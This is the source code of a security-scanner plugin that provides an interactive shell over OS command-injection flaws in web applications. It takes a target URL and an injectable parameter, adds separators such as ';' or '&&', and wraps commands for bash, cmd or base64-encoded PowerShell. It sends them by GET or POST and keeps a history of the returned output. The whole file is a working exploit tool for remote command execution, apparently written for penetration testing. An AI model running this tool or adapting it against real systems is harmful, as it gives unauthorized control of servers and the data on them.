// 命令执行交互式漏洞利用插件
// 用于命令执行漏洞的交互式利用

// 插件元数据
fn get_manifest() {
    let manifest = #{
        name: "命令执行交互式Shell",
        description: "提供命令执行漏洞的交互式命令行界面，允许用户通过Web界面连续执行系统命令",
        author: "RShield Team",
        version: "1.0.0",
        rtype: "vuln",
        severity: "critical",
        references: [
            "https://owasp.org/www-community/attacks/Command_Injection",
            "https://portswigger.net/web-security/os-command-injection"
        ],
        params: [
            #{
                name: "目标URL",
                key: "target",
                type: "string",
                required: true,
                description: "目标网站URL，包含可能存在命令注入的参数"
            },
            #{
                name: "命令参数名",
                key: "cmd_param",
                type: "string",
                required: true,
                description: "包含命令注入的参数名称"
            },
            #{
                name: "请求方法",
                key: "method",
                type: "select",
                options: [
                    #{label: "GET", value: "GET"},
                    #{label: "POST", value: "POST"}
                ],
                required: true,
                default_value: "GET",
                description: "HTTP请求方法"
            },
            #{
                name: "前置命令",
                key: "prefix",
                type: "string",
                required: false,
                description: "命令前缀，例如';', '|', '&&' 等"
            },
            #{
                name: "后置命令",
                key: "suffix",
                type: "string",
                required: false,
                description: "命令后缀，例如 ';"
            },
            #{
                name: "Shell类型",
                key: "shell_type",
                type: "select",
                options: [
                    #{label: "bash", value: "bash"},
                    #{label: "cmd", value: "cmd"},
                    #{label: "powershell", value: "powershell"}
                ],
                required: true,
                default_value: "bash",
                description: "目标系统的Shell类型"
            },
            #{
                name: "命令",
                key: "command",
                type: "string",
                required: false,
                default_value: "whoami",
                description: "要执行的命令"
            },
            #{
                name: "代理URL",
                key: "proxy_url",
                type: "string",
                required: false,
                default_value: "http://127.0.0.1:8080",
                description: "HTTP代理URL，例如http://127.0.0.1:8080"
            }
        ],
        result_fields: [
            #{
                name: "命令",
                key: "command",
                type: "string",
                description: "执行的命令"
            },
            #{
                name: "输出",
                key: "output",
                type: "string",
                description: "命令执行结果"
            },
            #{
                name: "状态",
                key: "status",
                type: "boolean",
                description: "命令执行状态"
            },
            #{
                name: "会话ID",
                key: "session_id",
                type: "string",
                description: "交互式会话ID，用于前端跟踪会话状态"
            },
            #{
                name: "历史记录",
                key: "history",
                type: "array",
                description: "命令执行历史记录"
            }
        ]
    };
    return to_json(manifest);
}

// 发送HTTP请求
fn send_http_request(params) {
    let request_json = to_json(params);
    
    // 打印请求信息
    print_debug("正在发送 HTTP 请求: " + request_json);
    
    // 使用内置的 HTTP 请求函数
    let response = http_request(request_json);
    
    // 打印响应信息
    print_debug("收到 HTTP 响应: " + response);
    
    // 解析响应
    let parsed_response = parse_json(response);
    
    // 检查错误
    if parsed_response.error != () {
        print_error("HTTP 请求错误: " + parsed_response.error);
    }
    
    return parsed_response;
}

// 执行命令并获取结果
fn execute_command(target, cmd_param, command, method, prefix, suffix, shell_type, proxy_url) {
    // 验证cmd_param
    if cmd_param == () || cmd_param == "" {
        print_error("命令参数名称为空");
        return #{
            error: "命令参数名称不能为空",
            body: "",
            status_code: 400,
            status_text: "Bad Request"
        };
    }

    let full_command = command;
    
    // 根据shell类型添加特定的处理
    if shell_type == "powershell" {
        // 对PowerShell命令进行编码
        full_command = `powershell -EncodedCommand ${encode_base64(utf8_to_bytes("& {" + command + "}"))}`; 
    } else if shell_type == "cmd" {
        // Windows CMD命令
        full_command = `cmd /c ${command}`;
    }
    // bash是默认值，不需要特殊处理
    
    // 添加前缀和后缀
    if prefix != () && prefix != "" {
        full_command = prefix + " " + full_command;
    }
    
    if suffix != () && suffix != "" {
        full_command = full_command + " " + suffix;
    }
    
    // 构造HTTP请求参数
    let http_params = #{
        url: target,
        method: method
    };
    
    // 添加代理设置
    if proxy_url != () && proxy_url != "" {
        http_params.proxy_url = proxy_url;
    }
    
    print_debug("cmd_param: " + cmd_param);
    // 根据请求方法设置参数
    if method == "GET" {
        http_params.params = #{};
        // 获取实际的参数名值并用它作为键
        let param_name = cmd_param;
        let params_map = #{};
        params_map[param_name] = full_command;
        http_params.params = params_map;
    } else {
        // 对于POST请求，表单编码应该是字符串
        // 创建表单字符串: "key=value"
        // 注意：这里没有进行URL编码，可能存在特殊字符问题
        let form_string = cmd_param + "=" + url_encode(full_command);
        http_params.body = form_string;
        http_params.headers = #{
            "Content-Type": "application/x-www-form-urlencoded"
        };
    }
    
    // 发送请求
    let response = send_http_request(http_params);
    
    // 返回结果
    return response;
}

// 生成UUID作为会话ID
fn generate_session_id() {
    // 简化的UUID生成
    let chars = "abcdef0123456789";
    let uuid = "";
    
    for i in range(0, 32) {
        let index = (rand() * chars.len()).to_int();
        uuid += chars[index];
        
        if i == 7 || i == 11 || i == 15 || i == 19 {
            uuid += "-";
        }
    }
    
    return uuid;
}

// 主分析函数
fn analyze(request_json) {

    // 解析输入请求
    let request = parse_json(request_json);
    print_debug(`request: ${request}`);

    let target = request.target;
    
    // 获取自定义参数或使用默认值
    let params = request.params;
    if params == () {
        params = #{};
    }
    
    // 必需参数和可选参数获取
    let cmd_param = params.cmd_param;
    
    // 获取方法并设置默认值
    let method = params.method;
    if method == () || method == "" {
        method = "GET";
    }
    
    // 获取shell类型并设置默认值
    let shell_type = params.shell_type;
    if shell_type == () || shell_type == "" {
        shell_type = "bash";
    }
    
    // 可选参数
    let prefix = params.prefix;
    let suffix = params.suffix;
    let proxy_url = params.proxy_url;

    let command = params.command;
    if command == () || command == "" {
        command = "whoami";
    }

    let session_id = params.session_id;
    if session_id == () {
        session_id = generate_session_id();
    }

    let history = params.history;
    if history == () {
        history = [];
    }

    // 验证必要参数
    if target == () || target == "" {
        return #{
            success: false,
            details: "缺少目标URL参数",
            data: #{}
        };
    }
    
    if cmd_param == () || cmd_param == "" {
        return #{
            success: false,
            details: "缺少命令参数名称",
            data: #{}
        };
    }
    
    // 执行命令
    let response = execute_command(target, cmd_param, command, method, prefix, suffix, shell_type, proxy_url);
    
    // 存储命令和结果到历史记录
    let cmd_result = #{
        command: command,
        output: response.body,
        timestamp: now()
    };
    
    history.push(cmd_result);
    
    // 构建结果
    let result_data = #{
        command: command,
        output: response.body,
        status: response.error == (),
        session_id: session_id,
        history: history
    };
    
    // 返回结果
    return to_json(#{
        success: true,
        details: "命令执行成功",
        data: result_data,
        raw_output: response.body,
        status_code: response.status_code,
        status_text: response.status_text
    });
} 